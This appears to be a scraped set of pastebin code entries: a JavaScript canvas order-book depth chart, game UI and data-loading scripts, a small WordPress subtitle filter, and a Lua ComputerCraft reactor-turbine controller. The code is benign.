            asksFillColor: opt && opt.asksFillColor || 'rgba(236, 49, 75, .2)',
            axisColor: opt && opt.axisColor || 'rgba(97, 104, 138, .3)',
            color: opt && opt.color || 'rgba(81, 128, 159, .8)',
            bgColor: opt && opt.bgColor || 'rgba(23, 54, 72, .95)',
            dotColor: 'rgba(0 , 126, 224, 1)',
            tipColor: opt && opt.tipColor || '#C7CCE6',
            tipShadow: 4
        },
        'hb-day': {
            bidsLineColor: opt && opt.bidsLineColor || 'rgba(3, 192, 135, 0)',
            asksLineColor: opt && opt.asksLineColor || 'rgba(231, 109, 66, 0)',
            bidsFillColor: opt && opt.bidsFillColor || 'rgba(3, 192, 135, .1)',
            asksFillColor: opt && opt.asksFillColor || 'rgba(231, 109, 66, .1)',
            axisColor: opt && opt.axisColor || 'rgba(180, 188, 227, .3)',
            color: opt && opt.color || '#232A4A',
            bgColor: opt && opt.bgColor || '#ffffff',
            dotColor: 'rgba(0 , 126, 224, 1)',
            tipColor: opt && opt.tipColor || '#9CA9B5',
            tipShadow: 4
        }
  }
  let options = {
      theme: opt && opt.theme || 'hb-night',
      ruleHeight: opt && opt.ruleHeight || 30,
      ruleWidth: opt && opt.ruleWidth || 54,
      priceFix: opt && opt.priceFix || 2,
      amountFix: opt && opt.amountFix || 0,
      paddingTop: opt && opt.paddingTop || 15,
      noAmountTick: opt && opt.noAmountTick || 500,
      lang: opt && opt.lang || 'en-us',
      langMap: opt && opt.langMap
  }
  function initTheme(theme) {
      let _theme = theme || options.theme;
      Object.keys(themeMap['hb-day']).forEach(i => {
          options[i] = themeMap[_theme][i]
      })
  }
  initTheme()
  console.log(options)
  let langMap = Object.assign({
    'zh-cn': {
      'ÂßîÊâò‰ª∑': 'ÂßîÊâò‰ª∑',
      'Á¥ØËÆ°' : 'Á¥ØËÆ°'
    },
    'en-us': {
      'ÂßîÊâò‰ª∑': 'Price',
      'Á¥ØËÆ°' : 'Sum'
    }
  }, options.langMap || {})

  let asks = []
  let bids = []
  let bigAmount = 0
  let recentX, tipLastX

  let dom = typeof (DOM) === 'string' ? document.querySelector('#' + DOM.replace('#', '')) : (DOM || document.querySelector('#chart'))
  let chart = document.createElement('canvas')
  let chartW = dom.offsetWidth
  let chartH = dom.offsetHeight
  let tip = document.createElement('canvas')
  let tipCooldown = true

  let cChart = chart.getContext('2d')
  let cTip = tip.getContext('2d')

  let px = pixRatio(cChart)

  let chartAW = chartW - options.ruleWidth
  let chartAH = chartH - options.ruleHeight

  let paddingTop = ~~(chartH * options.paddingTop / 100)
  let paddingTopPX = paddingTop * px

  let chartDH = chartAH - paddingTop
  let chartDHPX = chartDH * px

  let chartAWPX = chartAW * px
  let chartAHPX = chartAH * px

  chart.width = tip.width = chartW * px
  chart.height = tip.height = chartH * px
  chart.style.position = tip.style.position = 'absolute'
  chart.style.width = tip.style.width = chartW + 'px'
  chart.style.height = tip.style.height = chartH + 'px'
  // chart.style.left = chart.style.top = tip.style.top = tip.style.left = 0

  dom.style.position = 'relative'
  dom.appendChild(chart)
  dom.appendChild(tip)


  function getPos(e) {
      let rect = chart.getBoundingClientRect()
      return {
          x: (e.clientX - rect.left) * px,
          y: (e.clientY - rect.top) * px
      }
  }
  function getNearestX(p, t) {
      if (t === 'bids') {
          let m = bids.map(i => Math.abs(i[0] - p))
          if (m.indexOf(Math.min.apply(null, m)) > -1) {
            recentX = bids[m.indexOf(Math.min.apply(null, m))][1]
          }
          return recentX
      } else {
          let m = asks.map(i => Math.abs(i[0] - p))
          if (m.indexOf(Math.min.apply(null, m)) > -1) {
            recentX = asks[m.indexOf(Math.min.apply(null, m))][1]
          }
          return recentX
      }
  }
  function getDotPos(x, y) {
	  x = x || tipLastX
	  if (!x) return;
      tipLastX = x
      clear(cTip)
      tipCooldown = false
      if (x > chartAWPX - px) {
          tipCooldown = true
          return
      }
      let d = cChart.getImageData(x, 0, 1, chartAHPX - (~~1.5 * px))
      for (let i = 0; i < d.height; i++) {
          let color = d.data[i * 4 * d.width]
          let color1 = d.data[i * 4 * d.width + 1]
          if (color || color1) {
              drawTooltip(x, i, x > (chartAWPX / 2) ? 'asks' : 'bids')
              tipCooldown = true
              return
          }
      }
      tipCooldown = true
  }
  function getIntLength(x) {
      const [int] = (x + '').split('.');
      return int.length;
  }
  const binaryArr = {
    1000 : ['K','M','B'],
    10000 : ['‰∏á','‰∫ø','ÂÖÜ']
  }
  function shortIndex(num, lens, binary = 1000) {
        const nameArr = binaryArr[binary];
        const res = nameArr.reduce((sofar, cur) => {
            if (sofar[0] > binary) {
                sofar[0] /= binary;
                sofar[1] = cur;
            }
            return sofar;
        }, [num, '']);
        let len = lens;
        if (getIntLength(res[0]) === getIntLength(binary) - 1) {
            len -= 1;
        }
        res[0] = res[0].toFixed(len);
        return res.join('');
  }
  function drawDot(x, y, t) {
      options.dotColor = t === 'bids' ? options.bidsLineColor : options.asksLineColor
      cTip.beginPath()
      cTip.arc(x, y, 10 * px, 0, 2 * Math.PI)
      cTip.closePath()
      cTip.fillStyle = options.dotColor.replace('1)', '.3)')
      cTip.fill()
      cTip.beginPath()
      cTip.arc(x, y, 5 * px, 0, 2 * Math.PI)
      cTip.closePath()
      cTip.fillStyle = options.dotColor
	  cTip.fill()
	  drawDotDash(x, y, t)
  }
  function drawDotDash(x, y, t) {
	cTip.beginPath()
	cTip.strokeStyle = options[t+'LineColor'];
	cTip.lineWidth = ~~(2 * px)
	cTip.setLineDash([5 * px, 5 * px])
	cTip.moveTo(x, Math.min(y + 10 * px, chartAHPX))
	cTip.lineTo(x, chartAHPX)
	cTip.stroke()
	cTip.closePath()
  }

  function drawTooltip(x, y, t) {
	  drawDot(x, y, t)
      CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, r) {
          var min_size = Math.min(w, h)
          if (r > min_size / 2) r = min_size / 2
          this.beginPath()
          this.moveTo(x + r, y)
          this.arcTo(x + w, y, x + w, y + h, r)
          this.arcTo(x + w, y + h, x, y + h, r)
          this.arcTo(x, y + h, x, y, r)
          this.arcTo(x, y, x + w, y, r)
          this.closePath()
          return this
      }
      let delta = bigAmount ? Math.max(bigAmount.toFixed(options.amountFix).toString().length - 9, 0) : 0;
      let tipW = (delta * 6 + 140) * px
      let tipH = 90 * px
      let offsetDot = 18 * px
      cTip.shadowBlur = options.tipShadow * px
      cTip.shadowOffsetY = options.tipShadow * px
      let tipL = chartAW - x > tipW ? x + 4 : x - tipW - 2
      let tipT = y - tipH - offsetDot > cTip.shadowBlur ? y - tipH - offsetDot : y + offsetDot
      let tipLineForm = y - tipH - offsetDot > cTip.shadowBlur ? y - tipH - offsetDot : y + offsetDot
      let tipLineTo = y - tipH - offsetDot > cTip.shadowBlur ? y - offsetDot : y + tipH + offsetDot
      let xy = getXYRange()
      let price = xy.pTick * x + xy.pMin
      let amount = getNearestX(price, t)
      cTip.beginPath();
      cTip.moveTo(fix(x),fix(tipLineForm));
      cTip.lineTo(fix(x),fix(tipLineTo));
      cTip.closePath();
      cTip.lineWidth = ~~(4 * px)
      cTip.strokeStyle = t === 'bids' ? options.bidsLineColor : options.asksLineColor;
      cTip.stroke()
      cTip.fillStyle = options.bgColor;
      cTip.roundRect(tipL, tipT, tipW, tipH, 3 * px)
      cTip.fill()
      cTip.shadowBlur = 0
      cTip.shadowOffsetY = 0
      cTip.fillStyle = options.tipColor;
      cTip.font = 12 * px + 'px Arial'
      cTip.fillText(langMap[options.lang]['ÂßîÊâò‰ª∑'], tipL + 16 * px, tipT + 20 * px)
      cTip.fillText(price.toFixed(options.priceFix), tipL + 16 * px, tipT + 36 * px)
      cTip.fillText(t === 'bids' ? langMap[options.lang]['Á¥ØËÆ°'] : langMap[options.lang]['Á¥ØËÆ°'], tipL + 16 * px, tipT + 60 * px)
      cTip.fillText(amount.toFixed(options.amountFix), tipL + 16 * px, tipT + 76 * px)
  }

  function drawRule() {
      cChart.strokeStyle = options.axisColor
      cChart.lineWidth = ~~(1.5 * px)
      cChart.beginPath()
      cChart.moveTo(fix(0), fix(chartAHPX))
      cChart.lineTo(fix(chartAWPX), fix(chartAHPX))
      cChart.lineTo(fix(chartAWPX), fix(0))
      cChart.stroke()
      cChart.closePath()
  }

  function formatData(d) {
      let a = []
      let b = []
      d.asks.forEach((i, j) => {
          let l = []
          l.push(i[0])
          j - 1 > -1 ? l.push(i[1] * 1 + a[j - 1][1] * 1) : l.push(i[1])
          a.push(l)
      })
      let aMax = a[a.length - 1] ? a[a.length - 1][1] : 0
      d.bids.forEach((i, j) => {
          let l = []
          l.push(i[0])
          j - 1 > -1 ? l.push(i[1] * 1 + b[j - 1][1] * 1) : l.push(i[1])
          b.push(l)
      })
      let bMax = b[b.length - 1] ? b[b.length - 1][1] : 0
      bigAmount = Math.max(bMax, aMax)
      asks = a
      bids = b.reverse()
  }

  function drawBids() {
      cChart.strokeStyle = options.bidsLineColor
      cChart.lineWidth = ~~(2 * px)
      cChart.beginPath()
      let b = bids.sort((x, y) => {
          return x[0] - y[0]
      })
      let padding = chartAWPX / b.length / 2
      for (let i = 0; i < b.length; i++) {
          if (i === 0) {
              cChart.moveTo(fix(i * padding), fix(getY(b[i][1])))
          }
          cChart.lineTo(fix(i * padding), fix(getY(b[i][1])))
          if (i === b.length - 1) {
              cChart.lineTo(fix(i * padding), fix(chartAHPX - px))
          }
      }
	  cChart.stroke()
      cChart.lineTo(fix(0), fix(chartAHPX))
      cChart.lineTo(fix(0), fix(0))
      cChart.closePath()
      cChart.fillStyle = options.bidsFillColor
      cChart.fill()
  }

  function drawAsks() {
	  cChart.strokeStyle = options.asksLineColor
      cChart.beginPath()
      let a = asks.sort((x, y) => {
          return x[0] - y[0]
      })
      let padding = chartAWPX / a.length / 2
      let beginLeft = chartAWPX / 2 + 2 * px
      for (let i = 0; i < a.length; i++) {
          if (i === 0) {
              cChart.lineTo(fix(beginLeft), fix(chartAHPX - px))
          }
          cChart.lineTo(fix(i * padding + beginLeft), fix(getY(a[i][1])))
          if (i === a.length - 1) {
              cChart.lineTo(fix(chartAWPX), fix(getY(a[i][1])))
          }
      }
	  cChart.stroke()
      cChart.lineTo(fix(chartAWPX), fix(chartAHPX - px))
      cChart.lineTo(fix(beginLeft), fix(chartAHPX - px))
      cChart.closePath()
      cChart.fillStyle = options.asksFillColor
      cChart.fill()
  }

  function getTicks() {
      let xOff = 32 * px
      let yOff = 16 * px
      let xTick = ~~(chartAW / 100) - 1
      let yTick = ~~(chartAH / 100) + 1
      let xPadding = (chartAWPX - 2 * xOff) / xTick
      let yPadding = (chartAHPX - 2 * yOff) / yTick
      let xArr = []
      let pArr = []
      let yArr = []
      let aArr = []
      let sum = 0
      let noAmountArr = []
      let fewAmountArr = []
      let xy = getXYRange()
      for (let i = xOff; i < chartAWPX; i += xPadding) {
          xArr.push(i)
          pArr.push(xy.pMin + i * xy.pTick)
      }
      for (let i = chartAHPX - px; i > 0; i -= yPadding) {
          yArr.push(i)
          aArr.push((chartAHPX - px - i) * xy.aTick)
      }
      aArr.forEach((i, j) => {
          sum += i
          noAmountArr.push(options.noAmountTick * j)
          fewAmountArr.push(j)
      })
      if (bigAmount < 5 && sum !== 0) {
          aArr = fewAmountArr
          bigAmount = (chartDHPX - yPadding * yTick - 1) / yPadding + 5
      }
      if (sum === 0) {
          aArr = noAmountArr
      }
      aArr[0] = 0
      drawTicks(xArr, pArr, 'x')
      drawTicks(yArr, aArr, 'y')
  }

  function drawTicks(posArr, txtArr, t) {
      cChart.lineWidth = ~~(1.5 * px)
      cChart.strokeStyle = options.axisColor
      cChart.font = 12 * px + 'px Arial'
      cChart.fillStyle = options.color
      cChart.textAlign = t === 'x' ? 'center' : 'left'
      let lw = px
      if (t === 'x') {
          posArr.forEach((i, j) => {
              cChart.beginPath()
              cChart.lineTo(fix(i), chartAHPX + lw)
              cChart.lineTo(fix(i), (chartAH + 4) * px + lw)
              cChart.stroke()
              cChart.closePath()
              cChart.fillText(txtArr[j].toFixed(options.priceFix), fix(i), (chartAH + 20) * px + lw)
          })
      } else {
          posArr.forEach((i, j) => {
              let num = txtArr[j] <= 1000 ? txtArr[j].toFixed(0) : shortIndex(txtArr[j], 2, 1000);
              cChart.beginPath()
              cChart.lineTo(chartAWPX + lw, fix(i + lw))
              cChart.lineTo((chartAW + 4) * px + lw, fix(i + lw))
              cChart.stroke()
              cChart.fillText(num, (chartAW + 8) * px + lw, fix(i + 4 * px))
              cChart.closePath()
          })
      }
  }

  function fix(x) {
      return (~~x) + 0.5
  }

  function getY(y) {
      if (y === 0) {
          return chartAHPX - px
      }
      let Y = chartDHPX - chartDHPX * y / bigAmount + paddingTopPX
      if (Y - chartAHPX < ~~(cChart.lineWidth * px)) {
          return Y - ~~(cChart.lineWidth * px)
      } else {
          return Y
      }
  }

  function pixRatio(context) {
      return (window.devicePixelRatio || 1) /
          (context.backingStorePixelRatio ||
              context.webkitBackingStorePixelRatio ||
              context.mozBackingStorePixelRatio ||
              context.msBackingStorePixelRatio ||
              context.oBackingStorePixelRatio ||
              context.backingStorePixelRatio || 1)
  }

  function clear(c) {
      c.clearRect(0, 0, chartW * px, chartH * px)
  }

  function getXYRange() {
      let priceMin = bids[0] && bids[0][0] || 0
      let priceMax = asks[asks.length - 1] && asks[asks.length - 1][0] || 0
      return {
          pMin: priceMin * 1,
          pMax: priceMax * 1,
          pTick: (priceMax - priceMin) / chartAWPX,
          aTick: bigAmount / chartDHPX
      }
  }

  function putData(d) {
	  clear(cChart)
	  clear(cTip)
      formatData(d)
      drawRule()
      getTicks()
      drawBids()
	  drawAsks()
	  getDotPos()
  }

  function update() {
      clear(cChart)
      drawRule()
      getTicks()
      drawBids()
      drawAsks()
  }

  function forceUpdate() {
      resize()
      clear(cTip)
      update()
  }
  function reload(opt) {
      Object.assign(options, opt);
  }

  tip.addEventListener('mousemove', e => {
      let p = getPos(e)
      tipCooldown && getDotPos(p.x, p.y)
  }, false)
  tip.addEventListener('mouseout', e => {
      setTimeout(() => clear(cTip), 500)
      tipLastX = null
  }, false)
  function resize() {
      chartW = dom.offsetWidth
      chartH = dom.offsetHeight

      chart.width = tip.width = chartW * px
      chart.height = tip.height = chartH * px

      chart.style.width = tip.style.width = chartW + 'px'
      chart.style.height = tip.style.height = chartH + 'px'

      chartAW = chartW - options.ruleWidth
      chartAH = chartH - options.ruleHeight

      paddingTop = ~~(chartH * options.paddingTop / 100)
      paddingTopPX = paddingTop * px

      chartDH = chartAH - paddingTop
      chartDHPX = chartDH * px

      chartAWPX = chartAW * px
      chartAHPX = chartAH * px
      tipCooldown = true
  }
  return {
      update: update,
      putData: putData,
      forceUpdate: forceUpdate,
      initTheme: initTheme,
      reload: reload
  }
}

export default depthChart
"
XaeDWv3X,"Roe2Js :: ""canvasRenderPurse.js""",jargon,JavaScript,Tuesday 2nd of July 2024 09:31:42 PM CDT,"function canvasPurseTray ( ) {

	var purseSpanX = 5;
	var purseSpanY = 6;

	var ent_stats = [];

	var [ px, py, pz ] = cursorState ( layers.critter );
		
	var xOffset = viewSpanX * tileW;
	
	drawRectangle(xOffset+gutterW*2, gutterH, purseSpanX * tileW, purseSpanY * tileH, 'black', 'black');
		
	var ss = [];
	
	logFeats({ full_map: left(full_map[px][py][pz]+`________`,4)});
	
	ent_stats.stats = full_entity_stats[px][py];

	ss.push(ent_stats.stats);
	ss.card = {};
	ss.card.namesake = `Placeholder`;
	ss.card.actionRoster = [];
	
	switch(true){
	case (oobMap([px,py]) !== true):
		
		ss.push(ent_stats.stats);
		ss.card.namesake = `Out Of Bounds`;
		ss.card.actionRoster = [];
		
		break;
		
	case (invalidName(full_map[px][py][layers.critter],2)):
		
		ss.push(ent_stats.stats);
		ss.card.namesake = `Placeholder`;
		ss.card.actionRoster = [];
		
		break;
		
	case (oobMap([px,py]) === true):
		
		ss.push(full_entity_stats[px][py][layers.critter].stats);
		ss.card.namesake = ss.card.namesake;
		ss.card.actionRoster = sections(ss.card.action,4);
		
		break;
	}
	
	let buffer = [];
	
	for(let y = purseConstraints.viewMinY; y <= purseConstraints.viewMaxY; y++){
		for(let x = purseConstraints.viewMinX; x <= purseConstraints.viewMaxX; x++){
						
			buffer = [];
			
			if(y === 3){
				let z = x;
				if((z >= 0) && (z < layers.gui)){
					if(oobMap([px,py]) === true){
						buffer.push(
							full_map[px][py][z]
						);
					}
				}
			}
			
			let x1 = 0;
			let purseSpanX = 5;
			
			let y1 = 4;
			let purseSpanY = 3;
				
			if((x >= x1) && (x < x1 + purseSpanX) && (y >= y1) && (y < y1 + purseSpanY)){
				
				let i = (x - x1) + (y - y1) * purseSpanX;

				if((i >= 0) && (i < ss.card.actionRoster.length)){
					buffer.push( ss.card.actionRoster[i] );
				}
			}
			
			buffer.push(`sel2dots`);
			
			drawImageStack(buffer,xOffset+
			gutterW * 2 + x * tileW,gutterH + y * tileH,tileW,tileH);
		}
	}
	
	ss.card.namesake = ucwords(ss.card.namesake);
	
	switch(true){
	case (ucwords(ss.card.namesake) === ""Placeholder""):
	case (ucwords(ss.card.namesake) === ""Out Of Bounds""):
		break;
	default:		
		
		renderStats(px,py,z);
		
		drawText(gutterW + 0 * tileW, gutterH + 8 + 12,'16px Impact','white','"" ' + ss.card.namesake + ' ""');
		
		break;
	}
	
	return true;	
}

	function renderStatBar(x,y,width,height,caption,font,fg,bg){
		
		drawRectangle( x, y, width, height, 'black', bg );

		drawText( x, y, `${height}px ${font}`, fg, caption );
		
	}

	function renderStats(px,py,z){
			
		// var [ px, py, pz ] = cursorState ( layers.critter );
		
		var xOffset = viewSpanX * tileW + gutterW * 3;
		
		z = z || pz;
		
		let s = [];
		let pct = [];
		
		s['health'] = full_entity_stats[px][py][layers.critter].stats.health;
		
		s['stamina'] = full_entity_stats[px][py][layers.critter].stats.stamina;
		
		s['essence'] = full_entity_stats[px][py][layers.critter].stats.essence;
		
		renderStatusBar( s, 'health', tileW * viewSpanX + gutterW * 2, gutterH + gutterH * 2, tileW * purseSpanX, tileH / 2, 'black', 'red' );

		renderStatusBar( s, 'stamina', tileW * viewSpanX + gutterW * 2, gutterH + gutterH * 3, tileW * purseSpanX, tileH / 2, 'black', 'yellow' );

		renderStatusBar( s, 'essence', tileW * viewSpanX + gutterW * 2, gutterH + gutterH * 4, tileW * purseSpanX, tileH / 2, 'black', 'cyan' );
	}
	
function renderStatusBar(stat, attrName, gutterW, gutterH, width, height, fg, bg ) {
		
	// var [ px, py, pz ] = cursorState ( );

	let s = stat[attrName];
	
	let pct = [];
	let w = [];
	
	s.minimum = s.minimum || 0;
	s.maximum = s.maximum || 1;
	s.current = s.current || 0;
	s.recovery = s.recovery || 0;
			
	pct['current'] = Math.round(100 * s.current / s.maximum);

	pct['minimum'] = Math.round(100 * s.minimum / s.maximum);

	pct['maximum'] = Math.round(100 * s.maximum / s.maximum);

	pct['recovery'] = Math.round(100 * (s.current + s.recovery) / s.maximum);
	
	let x = gutterW;
	let y = gutterH + tileH;
	
	// s.current, s.recovery
	// s.minimum, s.maximum

	let caption = `${attrName}: ${s.current} / ${s.maximum}`;
	
	let font = 'Small Fonts';
	
	// fg, bg

	w['current'] = width * curve(pct['current']) / 100;
	w['recovery'] = width * curve(pct['recovery']) / 100;
	
	w['minimum'] = 0;
	w['maximum'] = width * curve(1.0) / 100;

	drawRectangle( x, y, w['maximum'], height, 'black', 'gray' );
	
	drawRectangle( x, y + gutterH / 2, w['current'], height - gutterH / 2, 'black', bg );

	drawRectangle( x, y, w['recovery'], height - gutterH / 2, 'rgba(0,0,0,0.0)', 'rgba(255,255,255,0.7)' );

	drawRectangle( x, y, width, height, 'black', 'rgba(0,0,0,0.0)' );

	drawText( x, y + gutterH, `${height*0.8}px ${font}`, 'black', caption );

}

function curve( x = 0 ) {
	var y = Math.sqrt(1 - x * x);
	y = (x + y) / 2;
	logFeats( { curve: y } );
	return y;
}
"
QEveptVP,post subtitle restrictions,arie_cristianD,PHP,Tuesday 2nd of July 2024 09:21:35 PM CDT,"add_filter( 'jnews_single_subtitle', 'subtitle_restrictions' );


function subtitle_restrictions( $subtitle ) {
	$subtitle = wp_trim_words( $subtitle, 20, '...' );
	return $subtitle;
}"
kTk0ggG7,"Roe2Js :: ""load game data.js""",jargon,JavaScript,Tuesday 2nd of July 2024 08:34:06 PM CDT,"var default_entity_stats = [];
var default_action_stats = [];

var entityLayers = [];
var entityRoster = [];

var actionRoster = [];

var full_entity_stats = [];
var full_map = [];

loadDefaultEntities();
loadDefaultActions();

function loadDefaultEntities() {
  try {
    // Load entity layers and default stats
    entityLayers = loadJSONDirect('/test dictionary/scripts/json/gamevars/entityRoster.json');
    default_entity_stats['____'] = loadJSONDirect('/test dictionary/scripts/json/gamevars/default stats.json');
    
    // Iterate over entity layers
    for (let layer = 0; layer < entityLayers.length; layer++) {
      entityRoster = entityLayers[layer];

      for (let index = 0; index < entityRoster.length; index++) {
        const entityName = entityRoster[index];
        const entityShortName = entityName.substring(0, 4);
        const filePath = `/test dictionary/scripts/json/gamevars/entities/${entityShortName}.json`;

        // Load entity stats
        const entityStats = loadJSONDirect(filePath);
        if (entityStats && entityStats[entityShortName]) {
          if (!default_entity_stats[entityName]) {
            default_entity_stats[entityName] = {};
          }
          default_entity_stats[entityName].stats = entityStats[entityShortName].stats;
        }
      }
    }
  } catch (error) {
    console.error('Error loading default entities:', error);
  }
}

function loadDefaultActions() {
  try {
    // Load action roster
    actionRoster = loadJSONDirect('/test dictionary/scripts/json/gamevars/actionRoster.json');

    for (let index = 0; index < actionRoster.length; index++) {
      const actionName = actionRoster[index];
      const actionShortName = actionName.substring(0, 4);
      const url = `/test dictionary/scripts/json/gamevars/actions/${actionShortName}.json`;

      // Load action stats
      const actionStats = loadJSONDirect(url);
      if (actionStats) {
        default_action_stats[actionShortName] = actionStats;
      }
    }
  } catch (error) {
    console.error('Error loading default actions:', error);
  }
}

function loadMap() {
  try {
    // Load the raw map data
    const rawMap = loadJSONDirect('/test dictionary/scripts/json/maps/demo.json');
    
    full_map = create3DArrayBlock('____', 0, rawMap.length - 1, 0, rawMap[0].length - 1, 0, layers.gui);
    full_entity_stats = create3DArrayBlock([], 0, rawMap.length - 1, 0, rawMap[0].length - 1, 0, layers.gui);

    for (let y = 0; y < rawMap[0].length; y++) {
      for (let x = 0; x < rawMap.length; x++) {
        for (let z = 0; z < layers.gui; z++) {
          const mapCell = rawMap[x][y][z];
          const mapCellShortName = mapCell.substring(0, 4);
          full_map[x][y][z] = mapCellShortName;

          if (default_entity_stats[mapCellShortName]) {
            full_entity_stats[x][y][z] = default_entity_stats[mapCellShortName];
          } else {
            full_entity_stats[x][y][z] = default_entity_stats['____'];
          }
        }
      }
    }

    cx = randInt(0, full_map.length - 1);
    cy = randInt(0, full_map[0].length - 1);
  } catch (error) {
    console.error('Error loading map:', error);
  }
}
"
JAXpppiE,Turbine Controller ExtremeReactor,Magnetar,Lua,Tuesday 2nd of July 2024 08:32:29 PM CDT,"function tprint (tbl, indent)
    if not indent then indent = 0 end
    local toprint = string.rep("" "", indent) .. ""{\r\n""
    indent = indent + 2 
    for k, v in pairs(tbl) do
      toprint = toprint .. string.rep("" "", indent)
      if (type(k) == ""number"") then
        toprint = toprint .. ""["" .. k .. ""] = ""
      elseif (type(k) == ""string"") then
        toprint = toprint  .. k ..  ""= ""   
      end
      if (type(v) == ""number"") then
        toprint = toprint .. v .. "",\r\n""
      elseif (type(v) == ""string"") then
        toprint = toprint .. ""\"""" .. v .. ""\"",\r\n""
      elseif (type(v) == ""table"") then
        toprint = toprint .. tprint(v, indent + 2) .. "",\r\n""
      else
        toprint = toprint .. ""\"""" .. tostring(v) .. ""\"",\r\n""
      end
    end
    toprint = toprint .. string.rep("" "", indent-2) .. ""}""
    return toprint
    
end
function log(text)
  local h = fs.open(""log.txt"", ""a"")
  h.write(text)
  h.close()
end

function countArray(arrayToCount)
  local counter = 0
  for _, part in ipairs(arrayToCount) do
    counter = counter + 1
  end
  return counter
end

reactor = {}
turbines = {}
capacitor_bank = {}
turbineFunctions = {
  getStats = function (turbine)
    local stats = {
      maxEnergyProducedInTick = 0,
      energyProducedLastTick = 0,
      active = false,
      api = turbine,
      id = tonumber(countArray(turbines)) +1
    } 
    if turbine.id ~= nil then
      stats = turbine
    else
      stats.api = turbine
      stats.active = stats.api.getActive()
    end
    stats.energyProducedLastTick = stats.api.getEnergyProducedLastTick()
    if stats.maxEnergyProducedInTick < stats.energyProducedLastTick then
      stats.maxEnergyProducedInTick = stats.energyProducedLastTick
    end
    turbines[stats.id] = stats
  end,

  spinUpTurbine = function(turbine)
    turbine.api.setActive(true)
    if turbine.api.getFluidFlowRate() < Settings.FluidFlowRateMax then
      turbine.api.setFluidFlowRateMax(Settings.FluidFlowRateMax)
    end
    if turbine.api.getRotorSpeed() < Settings.rotorSpinUpValue then
      if turbine.api.getInductorEngaged() then
        turbineFunctions.setTurbineInductorEngaged(turbine, false)
      end
    end
  end,
  spinDownTurbine = function (turbine)
    turbine.api.setActive(false)
    turbine.api.setFluidFlowRateMax(0)
    turbineFunctions.setTurbineInductorEngaged(turbine, false)
  end,
  spinUpAllTurbines = function ()
    for key, value in ipairs(turbines) do
      turbineFunctions.spinUpTurbine(value)
    end
  end,

  getTurbineEnergyOutputLastTick = function (turbine)
    return turbine.api.getEnergyProducedLastTick()
  end,

  setTurbineInductorEngaged = function(turbine, value)
    turbine.api.setInductorEngaged(value)
  end,

  stopAllTurbinesIfNeeded = function(turbine)
    for _, turbine in ipairs(turbines) do
      turbineFunctions.spinDownTurbine(turbine)
    end
  end,

  proofRotorSpeedIsEnough = function (turbine)
    if turbine.api.getRotorSpeed() >= Settings.rotorSpinUpValue then
      turbineFunctions.setTurbineInductorEngaged(turbine,true)
    end
  end
}
TankMaxFill = 15
TankEmptyFill = 0
TankSide = """"
Settings = {
  maxSteamToStorePercentage = 90,
  minSteamToStorePercentage = 20,
  FluidFlowRateMax = 2000,
  rotorSpinUpValue = 1820,
  maxEnergyToStorePercentage = 90,
  minEnergyToStorePercentage = 20,
}

function loadSettings()
  if not fs.exists(""settings.conf"") then
    saveSettings()
  end
  local file = fs.open(""settings.conf"", ""r"")
  local content = file.readAll()
  settings = textutils.unserialize(content)
  file.close()
end

function saveSettings()
  local file = fs.open(""settings.conf"", ""w"")
  file.write(textutils.serialize(settings))
  file.close()
end

function initialise()
    loadSettings()
    getCapacitorBank()
    getReactor()
    getTurbines()
    sleep(1)
    turbineFunctions.spinUpAllTurbines()
end

function loop()
  while true do
    --control Reactor by Steam in Tank (quik)
    getControlRodAdjustment()
    for _,turbine in ipairs(turbines) do
      if turbine.api.getActive() and not turbine.api.getInductorEngaged() then
        turbineFunctions.proofRotorSpeedIsEnough(turbine)
      end
      if turbine.api.getActive() and turbine.api.getInductorEngaged() then
        turbineFunctions.getStats(turbine)
      end
    end
    --control Turbines by Energy Puffer Storage (we have 4 Turbines energy storage = 60%) so 2 Turbines are running
    calculateIfMoreOreLessTurbinesNeeded()
    sleep(1)
  end
end

function getCapacitorBank()
  local peripherals = peripheral.getNames()
  for _, name in ipairs(peripherals) do
    if peripheral.getType(name) == ""capacitor_bank"" then
        capacitor_bank = peripheral.wrap(name)
        break
    end
  end
end

function getTank()
  local possibleSides =  redstone.getSides()
  for _, sides in ipairs(possibleSides) do
    if (redstone.getInput(sides)) then
      TankSide = sides
      break
    end
  end
end

function getTankFillstate()
  if TankSide == """" then
    getTank()
    sleep(1)
    return getTankFillstate()
  end
  return redstone.getAnalogueInput(TankSide)
end

function getReactor()
    local peripherals = peripheral.getNames()
    for _, name in ipairs(peripherals) do
        if peripheral.getType(name) == ""BigReactors-Reactor"" then
            reactor = peripheral.wrap(name)
            break
        end
    end
end

function getTurbines()
    local peripherals = peripheral.getNames()
    for test, name in ipairs(peripherals) do
        if peripheral.getType(name) == ""BigReactors-Turbine"" then
            turbineFunctions.getStats(peripheral.wrap(name))
        end
    end
end

function getControlRodAdjustment()
  local currentStorredSteam = getTankFillstate()
  local difMinMaxEnergyToStore = Settings.maxSteamToStorePercentage - Settings.minSteamToStorePercentage
  local maxPower = (TankMaxFill / 100) * Settings.maxSteamToStorePercentage
  local minPower = (TankMaxFill / 100) * Settings.minSteamToStorePercentage

  if currentStorredSteam >= maxPower then
    currentStorredSteam = maxPower
  elseif currentStorredSteam <= minPower then
    currentStorredSteam = minPower
  end
  --wie viel energy ist mehr als das minimum bereits gespeichert
  currentStorredSteam = tonumber(currentStorredSteam - (TankMaxFill / 100) * Settings.minSteamToStorePercentage)
  local rfInBetween = (TankMaxFill / 100) * difMinMaxEnergyToStore
  local rodLevel = tonumber(math.ceil((currentStorredSteam / rfInBetween) * 100))
  
  setControlRodsLevels(rodLevel)
end

function setControlRodsLevels (state)
  --local self = setmetatable({},reactor)
  local controlRods = reactor.getControlRodsLevels()
  for i in pairs(controlRods) do
    controlRods[i] = state
  end
  reactor.setControlRodsLevels(controlRods)
end

--pufferStoragePowerControll
function calculateIfMoreOreLessTurbinesNeeded()
  local turbinesCount = countArray(turbines)
  local calculatedMaxEnergyStorage = (capacitor_bank.getMaxEnergyStored() / 100) * Settings.maxEnergyToStorePercentage
  local calculatedMinEnergyStorage = (capacitor_bank.getMaxEnergyStored() / 100) * Settings.minEnergyToStorePercentage
  local storedEnergyCorrected = capacitor_bank.getEnergyStored() - calculatedMinEnergyStorage
  if storedEnergyCorrected <= 0 then
    storedEnergyCorrected = 0
  end
  local diffBetweenMaxMinEnergyStorage = calculatedMaxEnergyStorage - calculatedMinEnergyStorage
  local rfPerTurbine =  diffBetweenMaxMinEnergyStorage / turbinesCount
  local neededAmountOfTurbines = turbinesCount - (math.floor(storedEnergyCorrected / rfPerTurbine))
  if calculatedMaxEnergyStorage <= capacitor_bank.getEnergyStored() then
